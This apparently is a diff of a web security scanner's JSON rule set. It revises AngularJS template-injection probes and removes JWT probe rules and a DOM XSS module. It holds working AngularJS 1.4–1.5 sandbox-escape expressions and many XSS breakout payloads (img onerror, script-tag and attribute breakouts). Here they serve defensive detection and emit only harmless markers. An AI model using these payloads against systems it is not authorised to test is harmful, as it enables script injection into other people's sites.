-                  "var": "attack.metadata.browserNav.dom_xss.vulnerable"
+                  "var": "attack.metadata.browserNav.template_marker.vulnerable"
                 }
               ]
             }
@@ -3784,24 +3800,26 @@
               "tags": [
                 "angularjs",
                 "client-template-injection",
-                "sandbox-bypass",
                 "template_interpolation",
-                "html-entity-delimiters"
+                "html-entity-delimiters",
+                "template-marker-proof",
+                "non-executing-proof"
               ]
             },
             "docs": {
-              "description": "Generic AngularJS client-side template injection probe using HTML entity-encoded interpolation delimiters. The attack is gated by AngularJS technology and version evidence, not by application routes."
+              "description": "Generic AngularJS client-side template injection probe using HTML entity-encoded interpolation delimiters. This variant uses a non-executing concatenated template marker so scanners can confirm Angular expression evaluation without triggering noisy AngularJS 1.4 sandbox-escape compiler errors."
             },
             "constants": {
               "markerToken": "ptk-ng-rh-140-149",
-              "payload": "&#123;&#123;'a'.constructor.prototype.charAt=[].join;$eval('x=1&#125; &#125; &#125;;document.documentElement.setAttribute(String.fromCharCode(100,97,116,97,45,112,116,107,45,120,115,115),String.fromCharCode(112,116,107,45,110,103,45,114,104,45,49,52,48,45,49,52,57))//');&#125;&#125;",
+              "payload": "&#123;&#123;'ptk-ng-'+'rh-140-149'&#125;&#125;",
               "angularDetectRegex": "(?:\\bng-app\\b|\\bdata-ng-app\\b|\\bng-controller\\b|\\bdata-ng-controller\\b|\\bng-bind\\b|\\bdata-ng-bind\\b|\\bangular\\.module\\s*\\(|angularjs/|angular(?:\\.min)?\\.js)",
               "versionRegex": "angularjs/1\\.4\\.(?:[0-9])\\b|angular(?:\\.min)?\\.js[^\\n\\r<>]{0,160}1\\.4\\.(?:[0-9])\\b|1\\.4\\.(?:[0-9])\\b[^\\n\\r<>]{0,160}angular(?:\\.min)?\\.js|angular[-_.]1\\.4\\.(?:[0-9])\\b|angular[/_-][^\\n\\r<>]{0,160}1\\.4\\.(?:[0-9])\\b",
               "versionRange": "reflected-1-4-0-to-1-4-9",
               "context": "template_interpolation"
             },
             "extensions": {
-              "payloadFamily": "entity-dom-marker-default"
+              "payloadFamily": "entity-template-marker-default",
+              "selectorPriorityBoost": 1900
             }
           }
         },
@@ -3814,7 +3832,7 @@
             "config": {
               "browserNav": {
                 "checks": [
-                  "dom_xss"
+                  "template_marker"
                 ],
                 "markerToken": "ptk-ng-ra-140-149",
                 "settleMs": 1200,
@@ -3835,7 +3853,7 @@
                   "query",
                   "form"
                 ],
-                "value": "&#91;&#91;'a'.constructor.prototype.charAt=&#91;&#93;.join;$eval('x=1} } };document.documentElement.setAttribute(String.fromCharCode(100,97,116,97,45,112,116,107,45,120,115,115),String.fromCharCode(112,116,107,45,110,103,45,114,97,45,49,52,48,45,49,52,57))//');&#93;&#93;",
+                "value": "&#91;&#91;'ptk-ng-'+'ra-140-149'&#93;&#93;",
                 "position": "replace",
                 "operation": "replace"
               }
@@ -3845,13 +3863,13 @@
             "rule": {
               "or": [
                 {
-                  "var": "attack.browserNav.dom_xss.vulnerable"
+                  "var": "attack.browserNav.template_marker.vulnerable"
                 },
                 {
-                  "var": "attack.runtime.browserNav.dom_xss.vulnerable"
+                  "var": "attack.runtime.browserNav.template_marker.vulnerable"
                 },
                 {
-                  "var": "attack.metadata.browserNav.dom_xss.vulnerable"
+                  "var": "attack.metadata.browserNav.template_marker.vulnerable"
                 }
               ]
             }
@@ -3883,24 +3901,26 @@
               "tags": [
                 "angularjs",
                 "client-template-injection",
-                "sandbox-bypass",
                 "template_interpolation",
-                "html-entity-delimiters"
+                "html-entity-delimiters",
+                "template-marker-proof",
+                "non-executing-proof"
               ]
             },
             "docs": {
-              "description": "Generic AngularJS client-side template injection probe using HTML entity-encoded interpolation delimiters. The attack is gated by AngularJS technology and version evidence, not by application routes."
+              "description": "Generic AngularJS client-side template injection probe using HTML entity-encoded alternate interpolation delimiters. This variant uses a non-executing concatenated template marker so scanners can confirm Angular expression evaluation without triggering noisy AngularJS 1.4 sandbox-escape compiler errors."
             },
             "constants": {
               "markerToken": "ptk-ng-ra-140-149",
-              "payload": "&#91;&#91;'a'.constructor.prototype.charAt=&#91;&#93;.join;$eval('x=1} } };document.documentElement.setAttribute(String.fromCharCode(100,97,116,97,45,112,116,107,45,120,115,115),String.fromCharCode(112,116,107,45,110,103,45,114,97,45,49,52,48,45,49,52,57))//');&#93;&#93;",
+              "payload": "&#91;&#91;'ptk-ng-'+'ra-140-149'&#93;&#93;",
               "angularDetectRegex": "(?:\\bng-app\\b|\\bdata-ng-app\\b|\\bng-controller\\b|\\bdata-ng-controller\\b|\\bng-bind\\b|\\bdata-ng-bind\\b|\\bangular\\.module\\s*\\(|angularjs/|angular(?:\\.min)?\\.js)",
               "versionRegex": "angularjs/1\\.4\\.(?:[0-9])\\b|angular(?:\\.min)?\\.js[^\\n\\r<>]{0,160}1\\.4\\.(?:[0-9])\\b|1\\.4\\.(?:[0-9])\\b[^\\n\\r<>]{0,160}angular(?:\\.min)?\\.js|angular[-_.]1\\.4\\.(?:[0-9])\\b|angular[/_-][^\\n\\r<>]{0,160}1\\.4\\.(?:[0-9])\\b",
               "versionRange": "reflected-1-4-0-to-1-4-9",
               "context": "template_interpolation"
             },
             "extensions": {
-              "payloadFamily": "entity-dom-marker-alt"
+              "payloadFamily": "entity-template-marker-alt",
+              "selectorPriorityBoost": 1900
             }
           }
         },
@@ -4036,7 +4056,8 @@
               "context": "expression_context"
             },
             "extensions": {
-              "payloadFamily": "charat-orderby-dom-marker-fromcharcode"
+              "payloadFamily": "charat-orderby-dom-marker-fromcharcode",
+              "selectorPriorityBoost": 1160
             }
           }
         },
@@ -4108,7 +4129,7 @@
                   "query",
                   "form"
                 ],
-                "value": "'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };postMessage(String.fromCharCode(112,116,107,45,120,115,115,58,112,116,107,45,110,103,45,101,45,101,118,97,108,45,49,52,48,45,49,52,57),String.fromCharCode(42))//');",
+                "value": "'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };document.documentElement.setAttribute(String.fromCharCode(100,97,116,97,45,112,116,107,45,120,115,115),String.fromCharCode(112,116,107,45,110,103,45,101,45,101,118,97,108,45,49,52,48,45,49,52,57))//');",
                 "position": "replace",
                 "operation": "replace"
               }
@@ -4166,14 +4187,15 @@
             },
             "constants": {
               "markerToken": "ptk-ng-e-eval-140-149",
-              "payload": "'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };postMessage(String.fromCharCode(112,116,107,45,120,115,115,58,112,116,107,45,110,103,45,101,45,101,118,97,108,45,49,52,48,45,49,52,57),String.fromCharCode(42))//');",
+              "payload": "'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };document.documentElement.setAttribute(String.fromCharCode(100,97,116,97,45,112,116,107,45,120,115,115),String.fromCharCode(112,116,107,45,110,103,45,101,45,101,118,97,108,45,49,52,48,45,49,52,57))//');",
               "angularDetectRegex": "(?:\\bng-app\\b|\\bdata-ng-app\\b|\\bng-controller\\b|\\bdata-ng-controller\\b|\\bng-bind\\b|\\bdata-ng-bind\\b|\\bangular\\.module\\s*\\(|angularjs/|angular(?:\\.min)?\\.js)",
               "versionRegex": "angularjs/1\\.4\\.(?:[0-9])\\b|angular(?:\\.min)?\\.js[^\\n\\r<>]{0,160}1\\.4\\.(?:[0-9])\\b|1\\.4\\.(?:[0-9])\\b[^\\n\\r<>]{0,160}angular(?:\\.min)?\\.js|angular[-_.]1\\.4\\.(?:[0-9])\\b|angular[/_-][^\\n\\r<>]{0,160}1\\.4\\.(?:[0-9])\\b",
               "versionRange": "reflected-1-4-0-to-1-4-9",
               "context": "expression_context"
             },
             "extensions": {
-              "payloadFamily": "prototype-charat-eval"
+              "payloadFamily": "prototype-charat-eval",
+              "selectorPriorityBoost": 1450
             }
           }
         },
@@ -4207,7 +4229,7 @@
                   "query",
                   "form"
                 ],
-                "value": "{{x={'y':''.constructor.prototype};x['y'].charAt=[].join;$eval('x=postMessage(String.fromCharCode(112,116,107,45,120,115,115,58,112,116,107,45,110,103,45,114,45,49,53,48,45,49,53,56),String.fromCharCode(42))');}}",
+                "value": "{{x={'y':''.constructor.prototype};x['y'].charAt=[].join;$eval('x=document.documentElement.setAttribute(String.fromCharCode(100,97,116,97,45,112,116,107,45,120,115,115),String.fromCharCode(112,116,107,45,110,103,45,114,45,49,53,48,45,49,53,56))');}}",
                 "position": "replace",
                 "operation": "replace"
               }
@@ -4264,14 +4286,15 @@
             },
             "constants": {
               "markerToken": "ptk-ng-r-150-158",
-              "payload": "{{x={'y':''.constructor.prototype};x['y'].charAt=[].join;$eval('x=postMessage(String.fromCharCode(112,116,107,45,120,115,115,58,112,116,107,45,110,103,45,114,45,49,53,48,45,49,53,56),String.fromCharCode(42))');}}",
+              "payload": "{{x={'y':''.constructor.prototype};x['y'].charAt=[].join;$eval('x=document.documentElement.setAttribute(String.fromCharCode(100,97,116,97,45,112,116,107,45,120,115,115),String.fromCharCode(112,116,107,45,110,103,45,114,45,49,53,48,45,49,53,56))');}}",
               "angularDetectRegex": "(?:\\bng-app\\b|\\bdata-ng-app\\b|\\bng-controller\\b|\\bdata-ng-controller\\b|\\bng-bind\\b|\\bdata-ng-bind\\b|\\bangular\\.module\\s*\\(|angularjs/|angular(?:\\.min)?\\.js)",
               "versionRegex": "angularjs/1\\.5\\.(?:[0-8])\\b|angular(?:\\.min)?\\.js[^\\n\\r<>]{0,160}1\\.5\\.(?:[0-8])\\b|1\\.5\\.(?:[0-8])\\b[^\\n\\r<>]{0,160}angular(?:\\.min)?\\.js|angular[-_.]1\\.5\\.(?:[0-8])\\b|angular[/_-][^\\n\\r<>]{0,160}1\\.5\\.(?:[0-8])\\b",
               "versionRange": "reflected-1-5-0-to-1-5-8",
               "context": "template_interpolation"
             },
             "extensions": {
-              "payloadFamily": "prototype-charat-eval"
+              "payloadFamily": "prototype-charat-eval",
+              "selectorPriorityBoost": 1450
             }
           }
         },
@@ -4343,7 +4366,7 @@
                   "query",
                   "form"
                 ],
-                "value": "{y:''.constructor.prototype}.y.charAt=[].join;[1]|orderBy:'x=postMessage(String.fromCharCode(112,116,107,45,120,115,115,58,112,116,107,45,110,103,45,101,45,49,52,50,45,49,53,56),String.fromCharCode(42))'",
+                "value": "{y:''.constructor.prototype}.y.charAt=[].join;[1]|orderBy:'x=document.documentElement.setAttribute(String.fromCharCode(100,97,116,97,45,112,116,107,45,120,115,115),String.fromCharCode(112,116,107,45,110,103,45,101,45,49,52,50,45,49,53,56))'",
                 "position": "replace",
                 "operation": "replace"
               }
@@ -4400,14 +4423,15 @@
             },
             "constants": {
               "markerToken": "ptk-ng-e-142-158",
-              "payload": "{y:''.constructor.prototype}.y.charAt=[].join;[1]|orderBy:'x=postMessage(String.fromCharCode(112,116,107,45,120,115,115,58,112,116,107,45,110,103,45,101,45,49,52,50,45,49,53,56),String.fromCharCode(42))'",
+              "payload": "{y:''.constructor.prototype}.y.charAt=[].join;[1]|orderBy:'x=document.documentElement.setAttribute(String.fromCharCode(100,97,116,97,45,112,116,107,45,120,115,115),String.fromCharCode(112,116,107,45,110,103,45,101,45,49,52,50,45,49,53,56))'",
               "angularDetectRegex": "(?:\\bng-app\\b|\\bdata-ng-app\\b|\\bng-controller\\b|\\bdata-ng-controller\\b|\\bng-bind\\b|\\bdata-ng-bind\\b|\\bangular\\.module\\s*\\(|angularjs/|angular(?:\\.min)?\\.js)",
               "versionRegex": "angularjs/(?:1\\.4\\.(?:[2-9])|1\\.5\\.(?:[0-8]))\\b|angular(?:\\.min)?\\.js[^\\n\\r<>]{0,160}(?:1\\.4\\.(?:[2-9])|1\\.5\\.(?:[0-8]))\\b|(?:1\\.4\\.(?:[2-9])|1\\.5\\.(?:[0-8]))\\b[^\\n\\r<>]{0,160}angular(?:\\.min)?\\.js|angular[-_.](?:1\\.4\\.(?:[2-9])|1\\.5\\.(?:[0-8]))\\b|angular[/_-][^\\n\\r<>]{0,160}(?:1\\.4\\.(?:[2-9])|1\\.5\\.(?:[0-8]))\\b",
               "versionRange": "expression-1-4-2-to-1-5-8",
               "context": "expression_context"
             },
             "extensions": {
-              "payloadFamily": "orderby-prototype-charat"
+              "payloadFamily": "orderby-prototype-charat",
+              "selectorPriorityBoost": 1000
             }
           }
         },
@@ -4505,7 +4529,8 @@
               "context": "template_interpolation"
             },
             "extensions": {
-              "payloadFamily": "constructor-constructor-dom-marker"
+              "payloadFamily": "constructor-constructor-dom-marker",
+              "selectorPriorityBoost": 1320
             }
           }
         },
@@ -4612,7 +4637,8 @@
               "context": "template_interpolation"
             },
             "extensions": {
-              "payloadFamily": "constructor-constructor-alt-delimiters-dom-marker"
+              "payloadFamily": "constructor-constructor-alt-delimiters-dom-marker",
+              "selectorPriorityBoost": 1280
             }
           }
         },
@@ -4748,7 +4774,8 @@
               "context": "expression_context"
             },
             "extensions": {
-              "payloadFamily": "constructor-constructor-dom-marker"
+              "payloadFamily": "constructor-constructor-dom-marker",
+              "selectorPriorityBoost": 1320
             }
           }
         }
@@ -5411,64 +5438,6 @@
                           ]
                         }
                       ]
-                    },
-                    {
-                      "and": [
-                        {
-                          "==": [
-                            {
-                              "var": "module.executed.0.metadata.id"
-                            },
-                            "jwt_probe_no_both"
-                          ]
-                        },
-                        {
-                          "or": [
-                            {
-                              "!": {
-                                "==": [
-                                  {
-                                    "var": "module.executed.0.response.statusCode"
-                                  },
-                                  {
-                                    "var": "attack.response.statusCode"
-                                  }
-                                ]
-                              }
-                            },
-                            {
-                              ">": [
-                                {
-                                  "-": [
-                                    {
-                                      "var": "attack.response.length"
-                                    },
-                                    {
-                                      "var": "module.executed.0.response.length"
-                                    }
-                                  ]
-                                },
-                                30
-                              ]
-                            },
-                            {
-                              "<": [
-                                {
-                                  "-": [
-                                    {
-                                      "var": "attack.response.length"
-                                    },
-                                    {
-                                      "var": "module.executed.0.response.length"
-                                    }
-                                  ]
-                                },
-                                -30
-                              ]
-                            }
-                          ]
-                        }
-                      ]
                     }
                   ]
                 }
@@ -5530,8 +5499,7 @@
                     "var": "module.executed"
                   },
                   [
-                    "jwt_probe_no_cookie",
-                    "jwt_probe_no_both"
+                    "jwt_probe_no_cookie"
                   ],
                   {
                     "var": "original.response"
@@ -7321,8 +7289,7 @@
                         "var": "module.executed"
                       },
                       [
-                        "jwt_probe_no_authz",
-                        "jwt_probe_no_both"
+                        "jwt_probe_no_authz"
                       ],
                       {
                         "var": "original.response"
@@ -10817,958 +10784,6 @@
           "action": {},
           "validation": {
             "rule": false
-          },
-          "condition": {},
-          "target": {},
-          "requestGrouping": "inherit",
-          "metadata": {
-            "taxonomy": {},
-            "docs": {},
-            "constants": {},
-            "extensions": {}
-          }
-        }
-      ]
-    },
-    {
-      "id": "dom_xss_url_params",
-      "name": "Browser-navigation DOM XSS via URL parameters",
-      "type": "active",
-      "async": true,
-      "runtime": {
-        "mode": "browser_nav",
-        "hooks": [],
-        "confirmation": {},
-        "config": {
-          "browserNav": {}
-        }
-      },
-      "metadata": {
-        "taxonomy": {
-          "severity": "high",
-          "category": "xss",
-          "vulnId": "dom_xss",
-          "owasp": [
-            "A05:2025 - Injection",
-            "A03:2021 - Injection"
-          ],
-          "cwe": [
-            "CWE-79"
-          ],
-          "tags": [
-            "dast",
-            "xss",
-            "dom"
-          ]
-        },
-        "docs": {
-          "description": "Tests top-level GET query parameters for browser-executed XSS by opening a real browser attack tab and requiring an execution marker after load or safe synthetic interaction.",
-          "recommendation": "<p>Treat URL query parameters as untrusted input and never pass them into dangerous DOM sinks such as <code>innerHTML</code>, <code>outerHTML</code>, <code>insertAdjacentHTML</code>, inline event handlers, JavaScript URLs, style blocks, or script-building logic.</p>\n<ul> <li>Use <code>textContent</code> or equivalent safe DOM APIs for user-controlled strings.</li> <li>Avoid building HTML, CSS, JavaScript, or URLs directly from <code>window.location.search</code> and related URL sources.</li> <li>Apply contextual encoding or a well-configured sanitizer where rendering is unavoidable.</li> <li>Use a restrictive Content Security Policy to reduce exploitability.</li>\n</ul>",
-          "links": {
-            "OWASP": "https://owasp.org/Top10/2025/A05_2025-Injection/",
-            "CWE": "https://cwe.mitre.org/data/definitions/79.html"
-          }
-        },
-        "execution": {
-          "findingSemantics": "repeatable",
-          "capabilities": [],
-          "requiredEngineCapabilities": [],
-          "allowStrategyBulk": true,
-          "allowAuthLikeTargets": false,
-          "allowHardDeniedTargets": {},
-          "prefilters": {
-            "methods": [
-              "GET"
-            ],
-            "requiresQueryParams": true
-          }
-        },
-        "presentation": {
-          "aggregate": "route-param-sink"
-        },
-        "constants": {},
-        "extensions": {}
-      },
-      "attacks": [
-        {
-          "id": "dom_xss_url_params_html_img_onerror",
-          "name": "DOM XSS via query param HTML image onerror",
-          "runtime": {
-            "hooks": [],
-            "confirmation": {},
-            "config": {
-              "browserNav": {
-                "checks": [
-                  "dom_xss"
-                ],
-                "markerToken": "PTK_NAV_XSS_HTML_%%random%%",
-                "settleMs": 900
-              }
-            }
-          },
-          "action": {
-            "params": [
-              {
-                "value": "<img src=x onerror=\"window.postMessage({source:'ptk-xss',id:'PTK_NAV_XSS_HTML_%%random%%'},'*')\">",
-                "position": "after",
-                "operation": "add"
-              }
-            ]
-          },
-          "validation": {
-            "rule": {
-              "or": [
-                {
-                  "var": "attack.browserNav.dom_xss.vulnerable"
-                },
-                {
-                  "var": "attack.runtime.browserNav.dom_xss.vulnerable"
-                },
-                {
-                  "var": "attack.metadata.browserNav.dom_xss.vulnerable"
-                }
-              ]
-            }
-          },
-          "condition": {},
-          "target": {},
-          "requestGrouping": "inherit",
-          "metadata": {
-            "taxonomy": {},
-            "docs": {},
-            "constants": {},
-            "extensions": {}
-          }
-        },
-        {
-          "id": "dom_xss_url_params_attr_breakout",
-          "name": "DOM XSS via query param attribute breakout",
-          "runtime": {
-            "hooks": [],
-            "confirmation": {},
-            "config": {
-              "browserNav": {
-                "checks": [
-                  "dom_xss"
-                ],
-                "markerToken": "PTK_NAV_XSS_ATTR_%%random%%",
-                "settleMs": 900
-              }
-            }
-          },
-          "action": {
-            "params": [
-              {
-                "value": "\"><img src=x onerror=\"window.postMessage({source:'ptk-xss',id:'PTK_NAV_XSS_ATTR_%%random%%'},'*')\">",
-                "position": "after",
-                "operation": "add"
-              }
-            ]
-          },
-          "validation": {
-            "rule": {
-              "or": [
-                {
-                  "var": "attack.browserNav.dom_xss.vulnerable"
-                },
-                {
-                  "var": "attack.runtime.browserNav.dom_xss.vulnerable"
-                },
-                {
-                  "var": "attack.metadata.browserNav.dom_xss.vulnerable"
-                }
-              ]
-            }
-          },
-          "condition": {},
-          "target": {},
-          "requestGrouping": "inherit",
-          "metadata": {
-            "taxonomy": {},
-            "docs": {},
-            "constants": {},
-            "extensions": {}
-          }
-        },
-        {
-          "id": "dom_xss_url_params_js_double_quote_breakout",
-          "name": "DOM XSS via query param JS double-quote breakout",
-          "runtime": {
-            "hooks": [],
-            "confirmation": {},
-            "config": {
-              "browserNav": {
-                "checks": [
-                  "dom_xss"
-                ],
-                "markerToken": "PTK_NAV_XSS_JS_DQ_%%random%%",
-                "settleMs": 900
-              }
-            }
-          },
-          "action": {
-            "params": [
-              {
-                "value": "\";window.postMessage({source:'ptk-xss',id:'PTK_NAV_XSS_JS_DQ_%%random%%'},'*');//",
-                "position": "after",
-                "operation": "add"
-              }
-            ]
-          },
-          "validation": {
-            "rule": {
-              "or": [
-                {
-                  "var": "attack.browserNav.dom_xss.vulnerable"
-                },
-                {
-                  "var": "attack.runtime.browserNav.dom_xss.vulnerable"
-                },
-                {
-                  "var": "attack.metadata.browserNav.dom_xss.vulnerable"
-                }
-              ]
-            }
-          },
-          "condition": {},
-          "target": {},
-          "requestGrouping": "inherit",
-          "metadata": {
-            "taxonomy": {},
-            "docs": {},
-            "constants": {},
-            "extensions": {}
-          }
-        },
-        {
-          "id": "dom_xss_url_params_js_single_quote_breakout",
-          "name": "DOM XSS via query param JS single-quote breakout",
-          "runtime": {
-            "hooks": [],
-            "confirmation": {},
-            "config": {
-              "browserNav": {
-                "checks": [
-                  "dom_xss"
-                ],
-                "markerToken": "PTK_NAV_XSS_JS_SQ_%%random%%",
-                "settleMs": 900
-              }
-            }
-          },
-          "action": {
-            "params": [
-              {
-                "value": "';window.postMessage({source:'ptk-xss',id:'PTK_NAV_XSS_JS_SQ_%%random%%'},'*');//",
-                "position": "after",
-                "operation": "add"
-              }
-            ]
-          },
-          "validation": {
-            "rule": {
-              "or": [
-                {
-                  "var": "attack.browserNav.dom_xss.vulnerable"
-                },
-                {
-                  "var": "attack.runtime.browserNav.dom_xss.vulnerable"
-                },
-                {
-                  "var": "attack.metadata.browserNav.dom_xss.vulnerable"
-                }
-              ]
-            }
-          },
-          "condition": {},
-          "target": {},
-          "requestGrouping": "inherit",
-          "metadata": {
-            "taxonomy": {},
-            "docs": {},
-            "constants": {},
-            "extensions": {}
-          }
-        },
-        {
-          "id": "dom_xss_url_params_js_template_literal_breakout",
-          "name": "DOM XSS via query param JS template literal breakout",
-          "runtime": {
-            "hooks": [],
-            "confirmation": {},
-            "config": {
-              "browserNav": {
-                "checks": [
-                  "dom_xss"
-                ],
-                "markerToken": "PTK_NAV_XSS_JS_TPL_%%random%%",
-                "settleMs": 900
-              }
-            }
-          },
-          "action": {
-            "params": [
-              {
-                "value": "`;window.postMessage({source:'ptk-xss',id:'PTK_NAV_XSS_JS_TPL_%%random%%'},'*');//",
-                "position": "after",
-                "operation": "add"
-              }
-            ]
-          },
-          "validation": {
-            "rule": {
-              "or": [
-                {
-                  "var": "attack.browserNav.dom_xss.vulnerable"
-                },
-                {
-                  "var": "attack.runtime.browserNav.dom_xss.vulnerable"
-                },
-                {
-                  "var": "attack.metadata.browserNav.dom_xss.vulnerable"
-                }
-              ]
-            }
-          },
-          "condition": {},
-          "target": {},
-          "requestGrouping": "inherit",
-          "metadata": {
-            "taxonomy": {},
-            "docs": {},
-            "constants": {},
-            "extensions": {}
-          }
-        },
-        {
-          "id": "dom_xss_url_params_js_expression",
-          "name": "DOM XSS via query param JS expression execution",
-          "runtime": {
-            "hooks": [],
-            "confirmation": {},
-            "config": {
-              "browserNav": {
-                "checks": [
-                  "dom_xss"
-                ],
-                "markerToken": "PTK_NAV_XSS_JS_EXPR_%%random%%",
-                "settleMs": 900
-              }
-            }
-          },
-          "action": {
-            "params": [
-              {
-                "value": "window.postMessage({source:'ptk-xss',id:'PTK_NAV_XSS_JS_EXPR_%%random%%'},'*')",
-                "operation": "replace"
-              }
-            ]
-          },
-          "validation": {
-            "rule": {
-              "or": [
-                {
-                  "var": "attack.browserNav.dom_xss.vulnerable"
-                },
-                {
-                  "var": "attack.runtime.browserNav.dom_xss.vulnerable"
-                },
-                {
-                  "var": "attack.metadata.browserNav.dom_xss.vulnerable"
-                }
-              ]
-            }
-          },
-          "condition": {},
-          "target": {},
-          "requestGrouping": "inherit",
-          "metadata": {
-            "taxonomy": {},
-            "docs": {},
-            "constants": {},
-            "extensions": {}
-          }
-        },
-        {
-          "id": "dom_xss_url_params_js_regex_breakout",
-          "name": "DOM XSS via query param JS regex breakout",
-          "runtime": {
-            "hooks": [],
-            "confirmation": {},
-            "config": {
-              "browserNav": {
-                "checks": [
-                  "dom_xss"
-                ],
-                "markerToken": "PTK_NAV_XSS_JS_REGEX_%%random%%",
-                "settleMs": 900
-              }
-            }
-          },
-          "action": {
-            "params": [
-              {
-                "value": "/;window.postMessage({source:'ptk-xss',id:'PTK_NAV_XSS_JS_REGEX_%%random%%'},'*');//",
-                "operation": "add",
-                "position": "after"
-              }
-            ]
-          },
-          "validation": {
-            "rule": {
-              "or": [
-                {
-                  "var": "attack.browserNav.dom_xss.vulnerable"
-                },
-                {
-                  "var": "attack.runtime.browserNav.dom_xss.vulnerable"
-                },
-                {
-                  "var": "attack.metadata.browserNav.dom_xss.vulnerable"
-                }
-              ]
-            }
-          },
-          "condition": {},
-          "target": {},
-          "requestGrouping": "inherit",
-          "metadata": {
-            "taxonomy": {},
-            "docs": {},
-            "constants": {},
-            "extensions": {}
-          }
-        },
-        {
-          "id": "dom_xss_url_params_js_comment_breakout",
-          "name": "DOM XSS via query param JS block-comment breakout",
-          "runtime": {
-            "hooks": [],
-            "confirmation": {},
-            "config": {
-              "browserNav": {
-                "checks": [
-                  "dom_xss"
-                ],
-                "markerToken": "PTK_NAV_XSS_JS_COMMENT_%%random%%",
-                "settleMs": 900
-              }
-            }
-          },
-          "action": {
-            "params": [
-              {
-                "value": "*/window.postMessage({source:'ptk-xss',id:'PTK_NAV_XSS_JS_COMMENT_%%random%%'},'*');/*",
-                "operation": "add",
-                "position": "after"
-              }
-            ]
-          },
-          "validation": {
-            "rule": {
-              "or": [
-                {
-                  "var": "attack.browserNav.dom_xss.vulnerable"
-                },
-                {
-                  "var": "attack.runtime.browserNav.dom_xss.vulnerable"
-                },
-                {
-                  "var": "attack.metadata.browserNav.dom_xss.vulnerable"
-                }
-              ]
-            }
-          },
-          "condition": {},
-          "target": {},
-          "requestGrouping": "inherit",
-          "metadata": {
-            "taxonomy": {},
-            "docs": {},
-            "constants": {},
-            "extensions": {}
-          }
-        },
-        {
-          "id": "dom_xss_url_params_js_script_tag_breakout",
-          "name": "DOM XSS via query param script-tag breakout",
-          "runtime": {
-            "hooks": [],
-            "confirmation": {},
-            "config": {
-              "browserNav": {
-                "checks": [
-                  "dom_xss"
-                ],
-                "markerToken": "PTK_NAV_XSS_JS_SCRIPT_END_%%random%%",
-                "settleMs": 900
-              }
-            }
-          },
-          "action": {
-            "params": [
-              {
-                "value": "</script><script>window.postMessage({source:\"ptk-xss\",id:\"PTK_NAV_XSS_JS_SCRIPT_END_%%random%%\"},\"*\")</script><script>",
-                "operation": "add",
-                "position": "after"
-              }
-            ]
-          },
-          "validation": {
-            "rule": {
-              "or": [
-                {
-                  "var": "attack.browserNav.dom_xss.vulnerable"
-                },
-                {
-                  "var": "attack.runtime.browserNav.dom_xss.vulnerable"
-                },
-                {
-                  "var": "attack.metadata.browserNav.dom_xss.vulnerable"
-                }
-              ]
-            }
-          },
-          "condition": {},
-          "target": {},
-          "requestGrouping": "inherit",
-          "metadata": {
-            "taxonomy": {},
-            "docs": {},
-            "constants": {},
-            "extensions": {}
-          }
-        },
-        {
-          "id": "dom_xss_url_params_event_handler_value",
-          "name": "DOM XSS via query param event-handler value",
-          "runtime": {
-            "hooks": [],
-            "confirmation": {},
-            "config": {
-              "browserNav": {
-                "checks": [
-                  "dom_xss"
-                ],
-                "markerToken": "PTK_NAV_XSS_EVENT_VALUE_%%random%%",
-                "settleMs": 900
-              }
-            }
-          },
-          "action": {
-            "params": [
-              {
-                "value": "window.postMessage({source:'ptk-xss',id:'PTK_NAV_XSS_EVENT_VALUE_%%random%%'},'*')",
-                "operation": "replace"
-              }
-            ]
-          },
-          "validation": {
-            "rule": {
-              "or": [
-                {
-                  "var": "attack.browserNav.dom_xss.vulnerable"
-                },
-                {
-                  "var": "attack.runtime.browserNav.dom_xss.vulnerable"
-                },
-                {
-                  "var": "attack.metadata.browserNav.dom_xss.vulnerable"
-                }
-              ]
-            }
-          },
-          "condition": {},
-          "target": {},
-          "requestGrouping": "inherit",
-          "metadata": {
-            "taxonomy": {},
-            "docs": {},
-            "constants": {},
-            "extensions": {}
-          }
-        },
-        {
-          "id": "dom_xss_url_params_attribute_name_event",
-          "name": "DOM XSS via query param attribute-name event injection",
-          "runtime": {
-            "hooks": [],
-            "confirmation": {},
-            "config": {
-              "browserNav": {
-                "checks": [
-                  "dom_xss"
-                ],
-                "markerToken": "PTK_NAV_XSS_ATTR_NAME_%%random%%",
-                "settleMs": 900
-              }
-            }
-          },
-          "action": {
-            "params": [
-              {
-                "value": "onmouseover=\"window.postMessage({source:'ptk-xss',id:'PTK_NAV_XSS_ATTR_NAME_%%random%%'},'*')\" x",
-                "operation": "replace"
-              }
-            ]
-          },
-          "validation": {
-            "rule": {
-              "or": [
-                {
-                  "var": "attack.browserNav.dom_xss.vulnerable"
-                },
-                {
-                  "var": "attack.runtime.browserNav.dom_xss.vulnerable"
-                },
-                {
-                  "var": "attack.metadata.browserNav.dom_xss.vulnerable"
-                }
-              ]
-            }
-          },
-          "condition": {},
-          "target": {},
-          "requestGrouping": "inherit",
-          "metadata": {
-            "taxonomy": {},
-            "docs": {},
-            "constants": {},
-            "extensions": {}
-          }
-        },
-        {
-          "id": "dom_xss_url_params_attr_double_quote_event",
-          "name": "DOM XSS via query param double-quoted attribute event breakout",
-          "runtime": {
-            "hooks": [],
-            "confirmation": {},
-            "config": {
-              "browserNav": {
-                "checks": [
-                  "dom_xss"
-                ],
-                "markerToken": "PTK_NAV_XSS_ATTR_DQ_%%random%%",
-                "settleMs": 900
-              }
-            }
-          },
-          "action": {
-            "params": [
-              {
-                "value": "\" onmouseover=\"window.postMessage({source:'ptk-xss',id:'PTK_NAV_XSS_ATTR_DQ_%%random%%'},'*')\" x=\"",
-                "operation": "replace"
-              }
-            ]
-          },
-          "validation": {
-            "rule": {
-              "or": [
-                {
-                  "var": "attack.browserNav.dom_xss.vulnerable"
-                },
-                {
-                  "var": "attack.runtime.browserNav.dom_xss.vulnerable"
-                },
-                {
-                  "var": "attack.metadata.browserNav.dom_xss.vulnerable"
-                }
-              ]
-            }
-          },
-          "condition": {},
-          "target": {},
-          "requestGrouping": "inherit",
-          "metadata": {
-            "taxonomy": {},
-            "docs": {},
-            "constants": {},
-            "extensions": {}
-          }
-        },
-        {
-          "id": "dom_xss_url_params_attr_double_quote_onerror",
-          "name": "DOM XSS via query param double-quoted resource onerror breakout",
-          "runtime": {
-            "hooks": [],
-            "confirmation": {},
-            "config": {
-              "browserNav": {
-                "checks": [
-                  "dom_xss"
-                ],
-                "markerToken": "PTK_NAV_XSS_ATTR_DQ_ERR_%%random%%",
-                "settleMs": 900
